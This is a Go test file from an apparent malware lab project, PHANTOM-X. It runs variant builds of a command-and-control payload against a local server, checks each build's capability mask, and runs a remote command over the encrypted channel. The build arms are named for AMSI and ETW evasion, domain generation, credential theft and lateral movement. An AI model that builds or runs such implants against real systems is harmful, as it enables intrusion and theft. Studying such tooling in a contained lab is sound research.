// =============================================================================
// PHANTOM-X :: Phase 5 -- variant integration tests
// =============================================================================
// variants_test.go -- Drives the variant builds against the Go server.
//
// WHAT THIS PROVES
//     Each variant is a separate build with a separate wire behaviour.
//     A test that only exercised the baseline would pass whether or not
//     the variant code worked at all, so each variant gets its own
//     check.
//
//     The encrypted-channel test is the important one: the payload and
//     the server derive the keystream independently, in two different
//     languages, from the same key. If the two implementations disagree
//     by a single byte the session dies at the first frame, so a
//     successful session IS the proof that they agree.
//
// RUN
//     go test -v -run TestVariants -payload <path to variant binary> .
// =============================================================================

package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// flagVariant points at the variant build.
var flagVariant = flag.String("variant", "", "path to the variant payload binary")

// findVariant locates the variant build.
func findVariant(t *testing.T) string {
	t.Helper()
	if p := *flagVariant; p != "" {
		abs, err := filepathAbs(p)
		if err != nil {
			t.Fatalf("cannot resolve %q: %v", p, err)
		}
		if _, err := os.Stat(abs); err != nil {
			t.Fatalf("variant payload not found: %s", abs)
		}
		return abs
	}
	for _, rel := range []string{
		"..\\phase3_fileless\\loader\\px_variant.exe",
		"..\\dist\\native\\px_variant.exe",
	} {
		abs, _ := filepathAbs(rel)
		if _, err := os.Stat(abs); err == nil {
			return abs
		}
	}
	t.Skip("no variant payload found; build one with -variant <path>")
	return ""
}

// TestVariantCapabilities checks that the variant build reports its
// capabilities and that the server records them.
//
// The CAPS report is what makes a baseline session distinguishable from
// a variant session in the audit log, and therefore what makes the
// comparison between them possible. If it is missing or wrong, every
// measurement the lab takes is unattributable.
//
// NOTE ON THE DGA
//     A build with the domain generation variant compiled in resolves a
//     generated hostname, which does not resolve unless the lab's DNS
//     helper is running. The PX_C2_HOST override does NOT help: the DGA
//     replaces the host after the override is read. So the DGA needs
//     its own test with the DNS helper, and the other variants are
//     tested here.
func TestVariantCapabilities(t *testing.T) {
	payload := findVariant(t)
	port := 9411
	workdir := t.TempDir()
	logpath := workdir + "/caps.jsonl"

	srv := newServer("127.0.0.1", port, logpath, false, 0)
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	defer ln.Close()
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 30*time.Second)
	if sess == nil {
		t.Fatal("variant payload never established a session")
	}

	// The CAPS line arrives after HELLO. Wait for it.
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if sess.capReported {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !sess.capReported {
		t.Fatal("the variant payload did not report its capabilities")
	}

	// A mask of zero is a valid answer: it is what the BASELINE arm
	// reports, and it is exactly what the audit log needs in order to
	// tell a baseline session from a variant one.
	t.Logf("variant reported: 0x%02x (%s)", sess.capabilities, sess.capSummary)

	// Every capability bit must have a readable name. A mask with no
	// name is useless in an audit log months later.
	names := CapabilityNames(sess.capabilities)
	if sess.capabilities != 0 && len(names) == 0 {
		t.Fatalf("capability mask 0x%02x produced no names", sess.capabilities)
	}
	t.Logf("capability names: %v", names)

	// The mask must be EXACTLY the one this arm should report.
	//
	// This is the check that catches the bug where the payload sends
	// the mask in decimal and the server reads it as hex: the baseline
	// reports 0 and hides the difference, and the credit arm reports
	// 32, which the server reads as 0x32. Every arm looked fine because
	// nothing compared the number against what the build should have
	// said.
	if want, ok := expectedMaskFor(payload); ok {
		if sess.capabilities != want {
			t.Fatalf("arm %q reported mask 0x%02x, expected 0x%02x",
				armNameFor(payload), sess.capabilities, want)
		}
	}
}

// armNameFor extracts the arm name from a variant binary's file name.
//
// The build matrix names every arm "px_payload_<arm>.exe", so the file
// name is the arm's identity.
func armNameFor(payload string) string {
	base := filepath.Base(payload)
	base = strings.TrimSuffix(base, ".exe")
	return strings.TrimPrefix(base, "px_payload_")
}

// expectedMaskFor is the capability mask each arm is built to report.
//
// The table is the build matrix in one place, and it is the thing the
// server compares the reported mask against. Without it, a payload that
// reported the wrong mask would still pass every test, because the only
// checks were "the mask is not empty" and "the mask has names".
func expectedMaskFor(payload string) (uint32, bool) {
	switch armNameFor(payload) {
	case "baseline":
		return 0, true
	case "obfuscate":
		return CapObfuscated, true
	case "amsi":
		return CapAMSI, true
	case "etw":
		return CapETW, true
	case "encrypt":
		return CapEncrypted, true
	case "dga":
		return CapDGA, true
	case "cred":
		return CapCred, true
	case "lateral":
		return CapLateral, true
	case "caps":
		return CapLibrary, true
	case "xfer":
		// The transfer arm has no bit of its own: it is the plain
		// channel with the file-transfer and screen-capture code
		// compiled in, and the server has no reason to treat it as a
		// different arm.
		return 0, true
	case "resilient":
		// The resilient arm is the plain channel with a reconnect
		// loop. It looks the same on the wire, and that is the point:
		// the reconnect is invisible until it happens.
		return 0, true
	case "full":
		return CapObfuscated | CapAMSI | CapETW | CapEncrypted |
			CapDGA | CapCred | CapLateral | CapLibrary, true
	}
	return 0, false
}

// TestVariantEncryptedChannel drives the encrypted-channel variant.
//
// This is the cross-implementation check: the payload is C and the
// server is Go, and the two derive the keystream independently from the
// same key. A successful session means they agree byte for byte.
func TestVariantEncryptedChannel(t *testing.T) {
	payload := findVariant(t)
	port := 9412
	workdir := t.TempDir()
	logpath := workdir + "/enc.jsonl"

	srv := newServer("127.0.0.1", port, logpath, false, 0)
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	defer ln.Close()
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 30*time.Second)
	if sess == nil {
		t.Fatal("encrypted variant never established a session")
	}

	// The CAPS line has to be processed before anything else is sent.
	//
	// The server only sets up the keystreams when it reads the CAPS
	// report, so a command sent before that would go out in the clear
	// to a payload that is already expecting frames. The session would
	// then be stuck: the payload would wait for a frame and the server
	// would be waiting for a line.
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if sess.capReported {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !sess.capReported {
		t.Fatal("the variant payload did not report its capabilities")
	}
	if sess.capabilities&CapEncrypted == 0 {
		t.Skipf("this variant build does not have the encrypted channel "+
			"(mask=0x%02x)", sess.capabilities)
	}

	// A command round trip over the encrypted channel. The payload
	// executes it and the reply comes back through the same cipher.
	res := srv.exec(sess, "cmd /c echo PHANTOM_X_ENCRYPTED_PROOF", 30*time.Second)
	if res == nil {
		t.Fatal("EXEC over the encrypted channel timed out")
	}
	if !contains(res.Output, "PHANTOM_X_ENCRYPTED_PROOF") {
		t.Fatalf("encrypted round trip returned the wrong output: %q", res.Output)
	}
	t.Logf("encrypted round trip OK: %q", res.Output)
}

// contains is a tiny substring helper, so the test does not need the
// strings package for one call.
func contains(haystack, needle string) bool {
	return strings.Contains(haystack, needle)
}

// filepathAbs is filepath.Abs, wrapped so the test file does not need
// the import in two places.
func filepathAbs(p string) (string, error) {
	return filepath.Abs(p)
}
